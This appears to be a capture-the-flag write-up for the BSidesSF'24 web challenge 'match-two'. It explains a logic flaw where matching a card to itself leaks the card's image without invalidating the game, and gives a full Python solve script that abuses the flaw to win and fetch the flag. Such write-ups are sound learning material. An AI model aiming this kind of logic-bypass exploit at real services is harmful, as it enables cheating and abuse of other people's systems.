---
CTF: BSidesSF'24
Category: web
Points: "100"
Date: 2024-05-05
Solved?:
---
----
[<- Home](../../)
### TL;DR

Recreated using [WU](https://github.com/BSidesSF/ctf-2024-release/tree/main/match-two/solution)

**Flag**

```
ctf{fake_flag}
```

### Details

Description

> Match cards to win (again!), don't get any wrong
> 
> Author: itsc0rg1, Mandatory
> 
> https://match-two-c5478b38.challenges.bsidessf.net/


Files
< nope :/ >

Using `/match` endpoint we need to match the cards. However, the enumeration from 0 to 16 is not suitable, because if state = 0 is found somewhere, the game state will be set to INVALID and you cannot fetch the flag.

Here is the catch, `/match` has a logic error: if you make a call to match a card to itself - your game state remains valid.

```
/match?first_pos=2&second_pos=2
```

will give obj like this:

```
  {
    "first_svgdata": "PHN2Z [...]",
    "second_svgdata": "PHN2Z [...]",
    "state": -1
  }
```

solve.py

```python
#!/usr/bin/env python3

import sys
import json
import requests

from bs4 import BeautifulSoup

def solve():
    if len(sys.argv) != 3:
        print("Please specify challenge URL and the username")
        print("python solution.py <challenge-url> <username>")
        print("E.g, python3 solution.py http://127.0.0.1:8000 aboba")
        sys.exit()

    # Variables 
    url = sys.argv[1]
    username = sys.argv[2]
    password = "fake-ctf{fake-flag}"


    with requests.Session() as s:
        
        reg_param = {'username': username, 'password': password, 'confirm': password, 'submit': 'Register'}
        response = s.post(f"{url}/register", json=reg_param)
        print(f'[*] Created new user: {username=}, {password=}')
        
        login_param = {'username': username, 'password': password, 'submit': 'Login'}
        response = s.post(f"{url}/login", json=login_param)
        print(f'[*] Logged as {username}')

        imgs = []
        
        for i in range(0, 16):
            print(f'[*] Checking pos = {i}', end='\r')
            response = s.get(f"{url}/match?first_pos={i}&second_pos={i}")
            try:
                data = json.loads(response.text)
                if "first_svgdata" in data:
                    imgs.append(data["first_svgdata"])
            except json.JSONDecodeError as e:
                print(f"Error parsing JSON: {e}")
                sys.exit()

        print(f'[*] Checking for matching...')
        matching_positions = {}
        for i, x in enumerate(imgs):
            if x in matching_positions:
                print(f'[&] Found match: {matching_positions[x][0]} + {i}')
                matching_positions[x].append(i)
            else:
                matching_positions[x] = [i]
        
        match_url = f"{url}/match?"
        
        print(f'[*] Matching the cards...')
        for i in matching_positions:
            print(f'[&] {matching_positions[i]}')
            pos_args = f"&first_pos={matching_positions[i][0]}&second_pos={matching_positions[i][1]}"
            match_url = f"{url}/match?{pos_args}"
            response = s.get(match_url)

        print(f'[*] Here it comes....')
        response = s.get(f"{url}/flag")

        soup = BeautifulSoup(response.text, 'html.parser')
        flag = soup.find('h4').text.strip()
        print(f'{flag=}')


if __name__ == "__main__":
    solve()

```